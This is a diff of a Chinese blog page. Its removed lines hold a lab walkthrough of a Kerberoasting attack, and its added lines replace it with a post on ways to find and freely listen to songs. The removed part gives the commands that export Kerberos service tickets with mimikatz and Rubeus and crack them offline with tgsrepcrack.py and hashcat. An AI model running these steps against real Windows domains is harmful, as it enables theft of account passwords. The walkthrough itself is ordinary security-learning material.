@@ -16,26 +16,21 @@
   <meta name="author" content="Fraxdeo">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前言我将使用chatGPT在前言对一些基础性知识进行解释。 需要说明，图片托管在github上，国内IP访问github资源加载速度极慢或者加载失败，请尽量使用国外IP访问。 什么是Kerberoast攻击 Kerberoast是一种用于攻击 Windows 域环境中使用的 Kerberos 身份验证协议的攻击技术。Kerberos 是一种安全的身份验证协议，用于在 Windows 域环境中进行用">
+    <meta name="description" content="👀前言欣赏音乐的途径有很多，但是如何找到自己想要的欣赏的歌曲呢？国内的各大音乐平台，因为歌曲版权啊或者其他原因，不可能让我们在一个平台可以把想听的歌曲全部听到，这样折腾于各大平台的烦恼，可能大多数人都会有把。我就我找歌的经验，来谈一谈搜寻歌曲的“方法论”。 本文讨论的主题主要是“如何找到我们要听的歌曲”，区别于“如何找到我们喜欢的歌曲”，区别于“我如何去播放歌曲”，这都是“欣赏音乐”的不同姿势，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kerberoast攻击分析">
-<meta property="og:url" content="https://dbii.top/posts/20230529-b244341.html">
+<meta property="og:title" content="听歌的姿势一定要正确01">
+<meta property="og:url" content="https://dbii.top/posts/20230530-2db8aa1.html">
 <meta property="og:site_name" content="Fraxdeo&#39;s blog">
-<meta property="og:description" content="前言我将使用chatGPT在前言对一些基础性知识进行解释。 需要说明，图片托管在github上，国内IP访问github资源加载速度极慢或者加载失败，请尽量使用国外IP访问。 什么是Kerberoast攻击 Kerberoast是一种用于攻击 Windows 域环境中使用的 Kerberos 身份验证协议的攻击技术。Kerberos 是一种安全的身份验证协议，用于在 Windows 域环境中进行用">
+<meta property="og:description" content="👀前言欣赏音乐的途径有很多，但是如何找到自己想要的欣赏的歌曲呢？国内的各大音乐平台，因为歌曲版权啊或者其他原因，不可能让我们在一个平台可以把想听的歌曲全部听到，这样折腾于各大平台的烦恼，可能大多数人都会有把。我就我找歌的经验，来谈一谈搜寻歌曲的“方法论”。 本文讨论的主题主要是“如何找到我们要听的歌曲”，区别于“如何找到我们喜欢的歌曲”，区别于“我如何去播放歌曲”，这都是“欣赏音乐”的不同姿势，">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125706148.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125851635.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529130759981.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529131206163.png">
-<meta property="article:published_time" content="2023-05-29T03:29:24.000Z">
-<meta property="article:modified_time" content="2023-05-29T05:18:04.080Z">
+<meta property="article:published_time" content="2023-05-30T02:56:29.000Z">
+<meta property="article:modified_time" content="2023-05-30T05:06:02.283Z">
 <meta property="article:author" content="Fraxdeo">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125706148.png">
   
   
   
-  <title>Kerberoast攻击分析 - Fraxdeo&#39;s blog</title>
+  <title>听歌的姿势一定要正确01 - Fraxdeo&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -219,7 +214,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle">Kerberoast攻击分析</span>
+            <span id="subtitle">听歌的姿势一定要正确01</span>
           
         </div>
 
@@ -230,8 +225,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-05-29 11:29" pubdate>
-          2023年5月29日 上午
+        <time datetime="2023-05-30 10:56" pubdate>
+          2023年5月30日 上午
         </time>
       </span>
     
@@ -242,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.3k 字
+          1.5k 字
         
       </span>
     
@@ -253,7 +248,7 @@
         
         
         
-          19 分钟
+          13 分钟
         
       </span>
     
@@ -291,69 +286,74 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Kerberoast攻击分析</h1>
+            <h1 style="display: none">听歌的姿势一定要正确01</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我将使用chatGPT在前言对一些基础性知识进行解释。</p>
-<p>需要说明，图片托管在github上，国内IP访问github资源加载速度极慢或者加载失败，请尽量使用国外IP访问。</p>
-<h3 id="什么是Kerberoast攻击"><a href="#什么是Kerberoast攻击" class="headerlink" title="什么是Kerberoast攻击"></a>什么是Kerberoast攻击</h3><blockquote>
-<p>Kerberoast是一种用于攻击 Windows 域环境中使用的 Kerberos 身份验证协议的攻击技术。Kerberos 是一种安全的身份验证协议，用于在 Windows 域环境中进行用户身份验证和授权。在 Kerberos 协议中，用户会向 Kerberos 服务器请求一个安全令牌（ticket），用于在 Windows 域环境中访问资源。</p>
-<p>Kerberoast 攻击利用了 Kerberos 协议中的漏洞，通过获取 Kerberos 中的服务票据（Service Ticket），并对其进行离线攻击，从而获取到目标用户的明文密码。攻击者可以利用 Kerberoast 攻击来在不知道用户密码的情况下获取到用户的密码哈希值，然后使用密码破解工具对其进行破解，最终获取到用户的明文密码。由于攻击者可以在离线环境中进行攻击，因此 Kerberoast 攻击可以避免被 Kerberos 协议的防护机制所检测到。</p>
-</blockquote>
-<h3 id="什么是SPN"><a href="#什么是SPN" class="headerlink" title="什么是SPN"></a>什么是SPN</h3><blockquote>
-<p>SPN（Service Principal Name）是指服务主体名称，是 Kerberos 身份验证协议中用于标识服务实例的唯一标识符。SPN 通常由服务名称和主机名组成，用于标识服务在网络上的唯一实例，帮助 Kerberos 协议正确地将服务票据（Service Ticket）授予给服务实例。</p>
-<p>在 Windows 域环境中，SPN 是非常重要的，因为 Kerberos 身份验证协议是 Windows 域环境中最常用的身份验证协议。如果 SPN 配置不正确，可能会导致 Kerberos 身份验证协议无法正常工作，从而影响到整个域环境的安全和稳定性。</p>
-</blockquote>
-<h4 id="SPN的类型"><a href="#SPN的类型" class="headerlink" title="SPN的类型"></a>SPN的类型</h4><ul>
-<li>一种是注册在活动目录的机器帐户（Computers）下。当一个服务的权限为 Local System 或 Network Service 时，则 SPN 注册在机器帐户（Computers）下。</li>
-<li>另一种是注册在活动目录的域用户帐户（Users）下，当一个服务的权限为一个域用户时，则 SPN 注册在域用户帐户（Users）下。</li>
+                <h2 id="👀前言"><a href="#👀前言" class="headerlink" title="👀前言"></a>👀前言</h2><p>欣赏音乐的途径有很多，但是如何找到自己想要的欣赏的歌曲呢？国内的各大音乐平台，因为歌曲版权啊或者其他原因，不可能让我们在一个平台可以把想听的歌曲全部听到，这样折腾于各大平台的烦恼，可能大多数人都会有把。我就我找歌的经验，来谈一谈搜寻歌曲的“方法论”。</p>
+<p>本文讨论的主题主要是“如何找到我们要听的歌曲”，区别于“如何找到我们喜欢的歌曲”，区别于“我如何去播放歌曲”，这都是“欣赏音乐”的不同姿势，至于如何“白嫖”我们喜欢的音乐，我也会在本文讨论，但是要说明的是，如果你真的喜欢某首歌，请支持他。有比必要说明作者可是在网易云开通了黑胶VIP的，我可不是“白嫖怪”😜😜😜</p>
+<p>thene:<strong>如何找到我们要听的歌曲和白嫖ta？</strong></p>
+<h2 id="📌移动端"><a href="#📌移动端" class="headerlink" title="📌移动端"></a>📌移动端</h2><h3 id="✨姿势01：平台"><a href="#✨姿势01：平台" class="headerlink" title="✨姿势01：平台"></a>✨姿势01：平台</h3><p>很经典的一个方法，A音乐软件搜不到，到B音乐软件搜索，B音乐软件有，但是收费，到C短视频平台搜索。</p>
+<ul>
+<li>优点：免费</li>
+<li>缺点：不方便听歌</li>
 </ul>
-<p>域环境下执行命令：<code>setspn -q */*</code>查看当前域内所有SPN，SPN分类如下：</p>
-<p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN,默认有三个：</p>
-<p>域控制器：CN=DC,OU=Domain Controllers,DC=laosec,DC=cn</p>
-<p>域用户帐户：CN=krbtgt,CN=Users,DC=laosec,DC=cn</p>
-<p>机器帐户：CN=WIN7,CN=Computers,DC=laosec,DC=cn</p>
-<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></h3><p>从内存中提取明文密码、散列、PIN 码和 kerberos 票据现在已广为人知。**<code>mimikatz</code>**还可以执行 pass-the-hash、pass-the-ticket 或 build <em>Golden tickets</em>。</p>
-<h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a></h3><p>Rubeus是一个 C# 工具集，是可以针对Kerberos协议进行攻击的工具,可以发起Kerberos请求,并将请求票据导入内存中,Rebeus提供了大量的用于Kerberos攻击的功能,比如TGT请求/ST请求/AS-REP Roasting攻击/Kerberoasting攻击/委派攻击/黄金票据/白银票据等。</p>
-<h3 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a><a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat">Hashcat</a></h3><p>hashcat工具的简介与使用可以参考：<a target="_blank" rel="noopener" href="https://goyasha.com/post/ZKgJ5d4Q/">本文</a></p>
+<p>我喜欢的短视频平台是哔哩哔哩，也就是B站，而且B站还有<strong>听视频</strong>的功能，可以算是一个另类的播放器了。聚合各大音乐平台的音乐的UP主有很多，这里推荐两个：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://space.bilibili.com/229733301">音乐私藏馆</a></li>
+<li><a target="_blank" rel="noopener" href="https://space.bilibili.com/279180568">零距离音乐</a></li>
+</ul>
+<h3 id="✨姿势02：个人搭建的音乐搜索-amp-分享网站"><a href="#✨姿势02：个人搭建的音乐搜索-amp-分享网站" class="headerlink" title="✨姿势02：个人搭建的音乐搜索&amp;分享网站"></a>✨姿势02：个人搭建的音乐搜索&amp;分享网站</h3><ul>
+<li>优点：免费</li>
+<li>缺点：不稳定，随时可能失效</li>
+</ul>
+<p>这里推荐两个：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://music.liuzhijin.cn/">刘志进实验室</a></li>
+<li><a target="_blank" rel="noopener" href="https://tools.liumingye.cn/music/#/">音乐分享liumingye</a></li>
+</ul>
+<h3 id="✨姿势03：第三方音乐搜索下载软件"><a href="#✨姿势03：第三方音乐搜索下载软件" class="headerlink" title="✨姿势03：第三方音乐搜索下载软件"></a>✨姿势03：第三方音乐搜索下载软件</h3><p>☘ <a target="_blank" rel="noopener" href="https://lxmusic.toside.cn/">洛雪音乐</a></p>
+<ul>
+<li>免费无广告</li>
+<li>多端支持</li>
+<li>开源</li>
+</ul>
+<h3 id="✨姿势04：无损音乐下载站"><a href="#✨姿势04：无损音乐下载站" class="headerlink" title="✨姿势04：无损音乐下载站"></a>✨姿势04：无损音乐下载站</h3><p>百度一下<strong>无损音乐下载</strong>，一大把的无损音乐下载网站，我们可以搜一下想找的歌，没有搜索到也不打紧，多试试不同的下载站，可能有惊喜。</p>
+<h3 id="✨姿势05：国外平台-amp-软件"><a href="#✨姿势05：国外平台-amp-软件" class="headerlink" title="✨姿势05：国外平台&amp;软件"></a>✨姿势05：国外平台&amp;软件</h3><p>这个真没啥说的，只要你会，基本解决90%的找不到歌的问题，这里推荐一个国外的移动端安卓音乐软件，聚合的音乐资源来自油管，提供多种音乐格式下载，提供谷歌登陆方式，当然，国内方IP无法访问。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://ymusic.io/">YMusic</a></li>
+</ul>
+<p>​	Super convenient music app for you, enjoy music from YouTube with smallest consumed data! </p>
+<h3 id="✨姿势06：一个朋友"><a href="#✨姿势06：一个朋友" class="headerlink" title="✨姿势06：一个朋友"></a>✨姿势06：一个朋友</h3><p>如果你有一个超级会找资源的朋友，干嘛要自己动手呢😂😂</p>
 <hr>
-<p>工具的简介与使用互联网解释的比我好，上面工具罗列了他们的github地址，请参考</p>
-<h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p>域控：Windows service 2016</p>
-<p>​	同时安装SQL Server 2008 R2 </p>
-<p>​	同时创建用户mssql，密码sky@1321</p>
-<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">setspn -A MSSQLSvc/demo<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span>:<span class="hljs-number">1443</span> mssql<br></code></pre></td></tr></tbody></table></figure>
-
-<p>注册一条服务类为MSSQLSvc，主机为demo.test.com，端口为1433，注册在mssql域用户下</p>
-<figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">setspn -q <span class="hljs-strong">*/*</span><br></code></pre></td></tr></tbody></table></figure>
-
-<p>查看当前所有域</p>
-<figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Add</span>-<span class="hljs-keyword">Type</span> -AssemblyName <span class="hljs-keyword">System</span>.IdentityModel<br><span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/demo.test.com:1443"<br></code></pre></td></tr></tbody></table></figure>
-
-<p>请求SPNKerberos票据——单个服务</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125706148.png" srcset="/img/loading.gif" lazyload alt="image-20230529125706148"></p>
-<figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">klist</span><br></code></pre></td></tr></tbody></table></figure>
-
-<p>查看缓存中的所有票据</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125851635.png" srcset="/img/loading.gif" lazyload alt="image-20230529125851635"></p>
-<p>使用Rubeus和mimikatz都可以导出票据</p>
-<figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::list /<span class="hljs-keyword">export</span>	<span class="hljs-comment">//mimikatz执行</span><br>Rubeus.exe kerberoast /outfile:hash.txt<br></code></pre></td></tr></tbody></table></figure>
-
-<p>mimikatz:kerberos::list /export</p>
-<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2.<span class="hljs-number">7</span> tgsrepcrack<span class="hljs-selector-class">.py</span> zidian<span class="hljs-selector-class">.txt</span> ex.kirbi<br></code></pre></td></tr></tbody></table></figure>
-
-<p>在kali安装kerberoast，使用kerberoast的tgsrepcrack.py离线破解票据ex.kirbi</p>
-<p>rubeus:<img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529130759981.png" srcset="/img/loading.gif" lazyload alt="image-20230529130759981"></p>
-<p>因为hashcat的运行模式，在虚拟机破解报错，我们在真机运行以下命令，尝试破解</p>
-<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat<span class="hljs-selector-class">.exe</span> -m <span class="hljs-number">13100</span> hash<span class="hljs-selector-class">.txt</span> ziidian.txt<br></code></pre></td></tr></tbody></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529131206163.png" srcset="/img/loading.gif" lazyload alt="image-20230529131206163"></p>
-<p>成功，可以看到密码sky@1321</p>
-<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>注册主机名要和后面请求票据时保持一致。</p>
-<p>demo是主机名，test.com是域控网址。</p>
-<p>zidian.txt是包含密码的字典，可能不包含你设置账户的密码，可以自行添加</p>
-<p>-m 13100是破解的模式，可以这篇<a target="_blank" rel="noopener" href="https://goyasha.com/post/ZKgJ5d4Q/">文章</a>选择</p>
+<h2 id="📌PC端"><a href="#📌PC端" class="headerlink" title="📌PC端"></a>📌PC端</h2><p>电脑和移动端的方法大同小异，比如你可以安卓国产音乐软件，比如可以在浏览器输入<strong>bilibili.com</strong>，也可以在浏览器搜索<strong>音乐</strong>[滑稽.jpg]</p>
+<p>那就说说不一样的吧</p>
+<h3 id="✨姿势01"><a href="#✨姿势01" class="headerlink" title="✨姿势01"></a>✨姿势01</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://lxmusic.toside.cn/">洛雪音乐</a></li>
+</ul>
+<p>安装洛雪音乐这种开源无广告的聚合搜索软件，配置费点心思，使用体验超过很多国产软件。</p>
+<h3 id="✨姿势02"><a href="#✨姿势02" class="headerlink" title="✨姿势02"></a>✨姿势02</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://music.liuzhijin.cn/">刘志进实验室</a></li>
+<li><a target="_blank" rel="noopener" href="https://tools.liumingye.cn/music/#/">音乐分享liumingye</a></li>
+</ul>
+<p>使用以上这种音乐站来搜索你想找的歌，同时也可以听歌，不需要安装额外的软件，只需要收藏一下音乐网址。</p>
+<h3 id="✨姿势03"><a href="#✨姿势03" class="headerlink" title="✨姿势03"></a>✨姿势03</h3><p>安装浏览器插件，这里推荐一个浏览器插件Listen 1</p>
+<p>官方网站：<a target="_blank" rel="noopener" href="https://listen1.github.io/listen1/">https://listen1.github.io/listen1/</a></p>
+<p>github: <a target="_blank" rel="noopener" href="https://github.com/listen1">https://github.com/listen1</a></p>
+<p>使用方法在下载界面就可以看到，同时，你在网页登陆了网易云音乐，Listen 1上可以看到你的歌单，很方便。</p>
+<p>Listen 1也是聚合搜索，可以从国内各大音乐平台搜索你想要的歌，基本解决95%的问题。</p>
+<hr>
+<h2 id="📌结语："><a href="#📌结语：" class="headerlink" title="📌结语："></a>📌结语：</h2><p>通过以上的方式，基本你想听的歌都可以找到，可能有些歌因为版权原因不能搜索到，不能试听，这很正常，想要免费听歌，我也可以给以下建议：</p>
+<ul>
+<li>使用朋友的音乐会员</li>
+<li>在互联网上搜索音乐资源，下载音乐资源，如百度网盘，阿里网盘</li>
+<li>在短视频平台搜索自己想要听的歌</li>
+<li>在国外的音乐、视频平台搜索想听的歌</li>
+</ul>
+<p>最后，我想说，不听付费音乐就是最合理的免费，可能会省你的钱，可能会省你的时间……</p>
+<hr>
+<p>以上的找歌方法我基本想听的歌都能找到，一些小众的、某些翻唱搜不到就需要自己多花点时间和心思了，希望这篇文章可以帮助到有需要的人吧。</p>
 
                 
               </div>
@@ -372,7 +372,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-chain-item">内网渗透</a>
+  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%92%8C%E7%BD%91%E7%BB%9C%E6%8A%80%E8%83%BD/" class="category-chain-item">计算机和网络技能</a>
   
   
 
@@ -392,8 +392,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Kerberoast攻击分析</div>
-      <div>https://dbii.top/posts/20230529-b244341.html</div>
+      <div>听歌的姿势一定要正确01</div>
+      <div>https://dbii.top/posts/20230530-2db8aa1.html</div>
     </div>
     <div class="license-meta">
       
@@ -405,13 +405,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年5月29日</div>
+          <div>2023年5月30日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年5月29日</div>
+          <div>2023年5月30日</div>
         </div>
       
       
@@ -454,18 +454,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/20230530-2db8aa1.html" title="听歌的姿势一定要正确01">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">听歌的姿势一定要正确01</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/posts/20230528-1f757a4a.html" title="做人就是要要要要听歌！">
-                        <span class="hidden-mobile">做人就是要要要要听歌！</span>
+                      <a href="/posts/20230529-b244341.html" title="Kerberoast攻击分析">
+                        <span class="hidden-mobile">Kerberoast攻击分析</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
